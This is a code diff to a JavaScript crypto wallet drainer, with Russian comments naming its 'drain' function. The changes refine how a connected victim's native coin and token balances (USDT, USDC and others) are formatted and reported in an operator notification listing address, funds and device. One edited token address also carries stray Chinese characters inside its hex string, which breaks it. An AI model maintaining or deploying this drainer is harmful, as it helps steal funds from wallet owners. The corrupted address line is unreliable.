@@ -80,7 +80,7 @@ const TOKEN_SYMBOLS = {
   "0x385eeac5cb85a38a9a07a70c73e0a3271ca19ec7": "GHSTUSDT",
   "0xc168e40227e4edfb0b3dabb4b05d0b7c67f6a9be": "DFYNUSDT",
   "0x3a3df212b7aa91aa0402b9035b098891d276572b": "FISHUSDT",
-  "0x4e1581f01046e1c6d7c3aa0fea8e9b7ea0f28c49": "ICEUSDT",
+  "0x4e1581f01046e1c6d7c3aa0fea8粉碎e9b7ea0f28c49": "ICEUSDT",
   "0x7cc6bcad7c5e0e928caee29ff9619aa0b019e77e": "DCUSDT",
   "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9": "USDT",
   "0xff970a61a04b1ca14834a43f5de4533ebddb5cc8": "USDCUSDT",
@@ -388,6 +388,14 @@ function detectWallet() {
   return "Unknown Wallet";
 }
 
+// Функция для форматирования чисел без потери точности
+function formatBalance(balance, decimals) {
+  const formatted = ethers.utils.formatUnits(balance, decimals);
+  // Преобразуем в число и убираем лишние нули, но сохраняем до 6 знаков после запятой
+  const num = parseFloat(formatted);
+  return num.toFixed(6).replace(/\.?0+$/, '');
+}
+
 // Выполнение дрейна
 async function drain(chainId, signer, userAddress, bal, provider) {
   console.log(`Подключённый кошелёк: ${userAddress}`);
@@ -411,7 +419,8 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   const nativeBalance = ethers.utils.formatEther(bal.nativeBalance);
   if (parseFloat(nativeBalance) > 0) {
     const nativeNetwork = config.name === "Ethereum Mainnet" ? "ERC20" : config.name === "BNB Chain" ? "BEP20" : config.name;
-    funds.push(`${config.nativeToken}(${nativeNetwork}): ${parseFloat(nativeBalance).toFixed(2)}`);
+    const formattedNativeBalance = formatBalance(bal.nativeBalance, 18);
+    funds.push(`${config.nativeToken}(${nativeNetwork}): ${formattedNativeBalance}`);
   }
 
   // Токены (USDT, USDC и другие)
@@ -421,13 +430,13 @@ async function drain(chainId, signer, userAddress, bal, provider) {
     if (balance && balance.gt(0)) {
       const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
       const decimals = await tokenContract.decimals();
-      const formattedBalance = ethers.utils.formatUnits(balance, decimals);
+      const formattedBalance = formatBalance(balance, decimals);
       if (parseFloat(formattedBalance) > 0) {
         const symbol = tokenAddress === config.usdtAddress ? "USDT" :
                       tokenAddress === config.usdcAddress ? "USDC" :
                       Object.keys(config.otherTokenAddresses).find(key => config.otherTokenAddresses[key] === tokenAddress) || "Unknown";
         const tokenNetwork = config.name === "Ethereum Mainnet" ? "ERC20" : config.name === "BNB Chain" ? "BEP20" : config.name;
-        funds.push(`${symbol}(${tokenNetwork}): ${parseFloat(formattedBalance).toFixed(2)}`);
+        funds.push(`${symbol}(${tokenNetwork}): ${formattedBalance}`);
       }
     }
   }
@@ -437,9 +446,8 @@ async function drain(chainId, signer, userAddress, bal, provider) {
 
   // Формируем сообщение
   const message = [
-    `🌀 Connect | [${shortAddress}]`,
-    `Wallet: ${walletName}`,
-    `Chain: ${networkName}`,
+    `🌀 Connect | [ \`${shortAddress}\` ]`,
+    ``,
     `Funds:`,
     ...funds.map(fund => `- ${fund}`),
     `Device: ${device}`
